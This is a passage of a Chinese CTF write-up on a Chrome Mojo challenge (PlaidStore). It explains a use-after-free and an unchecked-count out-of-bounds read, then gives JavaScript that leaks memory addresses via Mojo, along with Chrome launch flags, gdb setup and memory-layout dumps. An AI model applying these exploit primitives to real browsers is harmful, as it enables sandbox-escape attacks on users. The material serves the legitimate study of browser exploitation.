@@ -1,0 +1,220 @@
+这个题目里的UAF和我们上面分析的那个case如出一辙，都是同样的生命周期管理的问题，由于MakeSelfOwnedReceiver将PlaidStoreImpl实例和message
+pipe关联在一起，只要不断开则PlaidStoreImpl实例不会被析构。
+而PlaidStoreImpl类保存了指向其所在render_frame_host的raw
+pointer，即`render_frame_host_`，但是并没有将它们的生命周期绑定，即render_frame_host被析构，但PlaidStoreImpl实例仍然可以存在。
+于是就可以通过在主frame里创建一个child iframe，然后在child iframe里将message
+pipe的remote端传给父frame，然后将child iframe从dom里移除，从而析构掉child
+iframe其对应的render_frame_host，但由于message
+pipe被传给了父frame，因此不会被断开，而此时render_frame_host已经被析构掉了。
+所以我们可以通过父frame来通过child iframe里传过来的message
+pipe的remote端，来调用其StoreData/GetData触发UAF。
+  * OOB
+        void PlaidStoreImpl::GetData(
+      const std::string &key,
+      uint32_t count,
+      GetDataCallback callback) {
+    if (!render_frame_host_->IsRenderFrameLive()) { // use
+      std::move(callback).Run({});
+      return;
+    }
+    auto it = data_store_.find(key);
+    if (it == data_store_.end()) {
+      std::move(callback).Run({});
+      return;
+    }
+    std::vector result(it->second.begin(), it->second.begin() + count);//oob
+    std::move(callback).Run(result);
+    }
+可以看出并没有约束count的大小，所以我们可以通过getData来越界读并返回读取的结果。
+### debug
+  * 解压mojo题，在本地开启一个server 
+        sakura@ubuntu:~/mojo$ ls
+    cc                      Dockerfile    mojo_js.zip      third_party
+    chrome                  extensions    plaidstore.diff  trigger.html
+    chrome_100_percent.pak  flag_printer  resources.pak    ui
+    chrome_200_percent.pak  gpu           run.sh           url
+    chrome.zip              icudtl.dat    server.py        v8_context_snapshot.bin
+    components              ipc           services         visit.sh
+    content                 locales       skia
+    device                  media         storage
+    devtools                mojo          swiftshader
+    ...
+    ...
+    sakura@ubuntu:~/mojo$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 ...
+    127.0.0.1 - - [20/Sep/2020 08:37:21] "GET /trigger.html HTTP/1.1" 200 -    127.0.0.1 - - [20/Sep/2020 09:36:21] "GET /trigger.html HTTP/1.1" 200 -    127.0.0.1 - - [20/Sep/2020 09:36:28] "GET /trigger.html HTTP/1.1" 200 -
+  * 启动chrome 
+        sakura@ubuntu:~/mojo$ ./chrome --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=/tmp/noexist --enable-blink-features=MojoJS,MojoJSTest http://localhost:8000/trigger.html
+  * debug启动chrome  
+写一个debug.sh，注意因为我们要调试的是browser进程，所以要跟随parent。
+        file ./chrome
+    set args --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=/tmp/noexist --enable-blink-features=MojoJS,MojoJSTest http://localhost:8000/trigger.html
+    set follow-fork-mode parent
+执行`gdb -x debug.sh`
+### oob leak and gadget
+    async function oob(){
+        console.log("oob");
+        var pipe = Mojo.createMessagePipe();
+        Mojo.bindInterface(blink.mojom.PlaidStore.name,
+        pipe.handle1, "context", true);
+        var plaid_store_ptr = new blink.mojom.PlaidStorePtr(pipe.handle0);
+        await plaid_store_ptr.storeData("aaa", [0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48]);
+        oob_data = await plaid_store_ptr.getData("aaa",0x20);
+        console.log(hex(b2i(oob_data.data.slice(0x10,0x18))));
+    }
+    [0920/093628.390634:INFO:CONSOLE(178)] "oob", source: http://localhost:8000/trigger.html (178)
+    [0920/093628.430111:INFO:CONSOLE(186)] "0x55ab6560a8b0", source: http://localhost:8000/trigger.html (186)
+可以看出我们leak出了一个很像地址的东西，那么我们可以调试一下我们到底可以越界读取到什么
+  * 首先我们可以看看创建PlaidStoreImpl的函数，并下一个断点，我们可以 
+        gdb-peda$ info functions PlaidStoreImpl
+    All functions matching regular expression "PlaidStoreImpl":
+    Non-debugging symbols:
+    0x0000000003c58170  content::PlaidStoreImpl::~PlaidStoreImpl()
+    0x0000000003c58170  content::PlaidStoreImpl::~PlaidStoreImpl()
+    0x0000000003c58190  content::PlaidStoreImpl::~PlaidStoreImpl()
+    0x0000000003c581c0  content::PlaidStoreImpl::StoreData(std::__1::basic_string, std::__1::allocator > const&, std::__1::vector > const&)
+    0x0000000003c582b0  content::PlaidStoreImpl::GetData(std::__1::basic_string, std::__1::allocator > const&, unsigned int, base::OnceCallback > const&)>)
+    0x0000000003c58490  content::PlaidStoreImpl::Create(content::RenderFrameHost*, mojo::PendingReceiver)
+    0x0000000003c58550  base::WeakPtr > mojo::MakeSelfOwnedReceiver(std::__1::unique_ptr >, mojo::PendingReceiver, scoped_refptr)
+    ...
+    (gdb) b content::PlaidStoreImpl::Create
+    Breakpoint 1 at 0x3c58494
+    (gdb) r
+    ...
+    => 0x5555591ac494 : push   r15
+     0x5555591ac496 : push   r14
+     0x5555591ac498 : push   rbx
+     0x5555591ac499 : sub    rsp,0x38
+     0x5555591ac49d :    mov    r14,rsi
+     0x5555591ac4a0 :    mov    rbx,rdi
+     0x5555591ac4a3 :    mov    edi,0x28 //从这里可以看出impl的大小是0x28
+     0x5555591ac4a8 :    
+      call   0x55555ac584b0  //operator new(unsigned long, std::nothrow_t const&),注意这条语句执行完了之后的rax就是impl的地址，所以我会在知道了这个地址之后，直接finish这个函数，然后看最终的对象布局。
+     0x5555591ac4ad :    
+      lea    rcx,[rip+0x635e2ec]        # 0x55555f50a7a0  //vtable for content::PlaidStoreImpl
+     0x5555591ac4b4 :    mov    QWORD PTR [rax],rcx
+     0x5555591ac4b7 :    
+      mov    QWORD PTR [rax+0x8],rbx
+     0x5555591ac4bb :    lea    rcx,[rax+0x18]
+     0x5555591ac4bf :    xorps  xmm0,xmm0
+     0x5555591ac4c2 :    
+      movups XMMWORD PTR [rax+0x18],xmm0
+     0x5555591ac4c6  // data_store_
+  * 然后我们执行到storeData结束，看看此时data_store_这个map是怎么保存数据的。 
+        gdb-peda$ x/20gx 0x00002dd26ed33870 //data_store_
+    0x2dd26ed33870: 0x0000000000000000  0x0000000000000000
+    0x2dd26ed33880: 0x00002dd26ed2edf8  0x000055555aba0101
+    0x2dd26ed33890: 0x0000000000616161//key1    0x0000000000000000
+    0x2dd26ed338a0: 0x0300000000000000  0x00002dd26ed2f0b0//value1
+    0x2dd26ed338b0: 0x00002dd26ed2f0c0  0x00002dd26ed2f0c0
+    0x2dd26ed338c0: 0xffffd22f00000001  0x0000000000000000
+    0x2dd26ed338d0: 0x0000000000000000  0x0000000000000000
+    0x2dd26ed338e0: 0x0000000000000000  0x0000000000000000
+    0x2dd26ed338f0: 0x00002dd26ed00000  0x00002dd26ec1c0c0
+    0x2dd26ed33900: 0x00002dd26ec1c0c0  0x0000000000000001
+    gdb-peda$ x/20gx 0x00002dd26ed2f0b0
+    0x2dd26ed2f0b0: 0x3837363534333231  0x4847464544434241
+    0x2dd26ed2f0c0: 0xffffd20000000001  0xfffffffd55553ec2
+    0x2dd26ed2f0d0: 0xffffd20000000001  0xfffffffd55553ec2
+    0x2dd26ed2f0e0: 0xffffd20000000001  0xfffffffd55553ec2
+    0x2dd26ed2f0f0: 0xffffd20000000001  0xfffffffd55553ec2
+为了继续往下，我需要简要的描述一下map的内存布局,chrome里使用的std::map标准库实现在[这里](https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/map)
+        template ::value && !__libcpp_is_final::value>
+    class __map_value_compare
+      : private _Compare
+    {
+    private:
+    ...
+      typedef __tree   __base;
+      __base __tree_;
+    }
+其实只有一个字段，也就是保存了一个`__tree`类型的成员变量，其实这就是红黑树(rb tree)的实现，map其实是rb
+tree的一层wrapper，实际的插入删除等，都是在`__tree`上完成的。  
+所以我们直接看`__tree`的内存布局即可。
+        template 
+    class __tree
+    {
+      private:
+      __iter_pointer                                     __begin_node_;
+      __compressed_pair  __pair1_;
+      __compressed_pair        __pair3_;
+其有三个成员变量，一个是指向起始tree_node的指针，其他两个字段用不到，也就不解释了。  
+那么我们现在就知道了，对于如下impl，其偏移0x10位置处就是保持着map的起始节点，而map是一颗rb
+tree，所以从这个节点我们就可以索引到其他所有插入的节点了。
+        gdb-peda$ x/20gx 0x2dd26ed2ede0
+    0x2dd26ed2ede0: 0x000055555f50a7a0 //vtable 0x00002dd26ec42400 // render_frame_host_
+    0x2dd26ed2edf0: |map start| 0x00002dd26ed2edf8  0x0000000000000000
+    0x2dd26ed2ee00: 0x0000000000000000|map end| --> // data_store_
+现在让我们看一下tree_node的具体内存布局
+    template  class __tree_end_node;
+    template  class __tree_node_base;
+    template  class __tree_node;
+    ...
+    // node
+    template 
+    class __tree_end_node
+    {
+    public:
+        typedef _Pointer pointer;
+        pointer __left_;
+        _LIBCPP_INLINE_VISIBILITY
+        __tree_end_node() _NOEXCEPT : __left_() {}
+    };
+    template 
+    class __tree_node_base
+        : public __tree_node_base_types::__end_node_type
+    {
+        typedef __tree_node_base_types _NodeBaseTypes;
+    public:
+        typedef typename _NodeBaseTypes::__node_base_pointer pointer;
+        typedef typename _NodeBaseTypes::__parent_pointer __parent_pointer;
+        pointer          __right_;
+        __parent_pointer __parent_;
+        bool __is_black_;
+        _LIBCPP_INLINE_VISIBILITY
+        pointer __parent_unsafe() const { return static_cast(__parent_);}
+        _LIBCPP_INLINE_VISIBILITY
+        void __set_parent(pointer __p) {
+            __parent_ = static_cast(__p);
+        }
+    private:
+      ~__tree_node_base() _LIBCPP_EQUAL_DELETE;
+      __tree_node_base(__tree_node_base const&) _LIBCPP_EQUAL_DELETE;
+      __tree_node_base& operator=(__tree_node_base const&) _LIBCPP_EQUAL_DELETE;
+    };
+    template 
+    class __tree_node
+        : public __tree_node_base
+    {
+    public:
+        typedef _Tp __node_value_type;
+        __node_value_type __value_;
+    private:
+      ~__tree_node() _LIBCPP_EQUAL_DELETE;
+      __tree_node(__tree_node const&) _LIBCPP_EQUAL_DELETE;
+      __tree_node& operator=(__tree_node const&) _LIBCPP_EQUAL_DELETE;
+    };
+所以对于一个tree_node，其保存的字段依次为，前四个大小是固定的，其整体大小依据`__node_value_type`的大小来决定，这个node_value_type实际上就是key-value这样一个pair对，在这里就是`pair>`
+    0x0 pointer __left_;
+    0x8 pointer          __right_;
+    0x10 __parent_pointer __parent_;
+    0x18 bool __is_black_;
+    0x20 __node_value_type __value_;
+所以我们来看一下内存
+    //PlaidStoreImpl
+    gdb-peda$ x/20gx 0x00003268b2727f00
+    0x3268b2727f00: 0x000055555f50a7a0  0x00003268b2643400
+    0x3268b2727f10: 0x00003268b271a780//first tree node 0x00003268b271a780
+    0x3268b2727f20: 0x0000000000000001
+    gdb-peda$ x/20gx 0x00003268b271a780
+    0x3268b271a780: 0x0000000000000000  0x0000000000000000
+    0x3268b271a790: 0x00003268b2727f18  0x0000000000000001
+    0x3268b271a7a0: |0x0000000061616161 0x0000000000000000
+    0x3268b271a7b0: 0x0400000000000000|-->string | 0x00003268b2757ba0-->vector
+    0x3268b271a7c0: 0x00003268b2757bc8  0x00003268b2757bc8 |
+    ...
+    // vector elements
+    gdb-peda$ x/20gx 0x00003268b2757ba0
+    0x3268b2757ba0: 0x3131313131313131  0x3131313131313131
+    0x3268b2757bb0: 0x3131313131313131  0x3131313131313131
+    0x3268b2757bc0: 0x3131313131313131  0x0000000000000000
+string的对象布局我没有看，不过我简单的解释一下这里为什么vector是这样的，因为其包括三个成员变量，首先是vector里元素的起始地址，然后是终止地址和容量。
